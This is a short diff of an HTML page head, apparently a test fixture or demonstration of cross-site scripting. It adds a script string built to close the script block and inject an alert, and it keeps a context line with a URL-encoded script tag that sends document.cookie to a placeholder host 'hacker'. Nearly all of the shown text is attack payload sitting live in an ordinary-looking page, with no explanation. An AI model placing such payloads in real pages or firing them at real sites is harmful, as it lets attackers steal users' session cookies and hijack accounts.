@@ -7,7 +7,9 @@
     <meta name="description" content="">
     <meta name="author" content="">
     <link rel="icon" href="../../favicon.ico">
-  
+<script>
+  var s = "surprise!</script><script>alert('whoops!')</script>";
+</script>  
    
 <SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
     
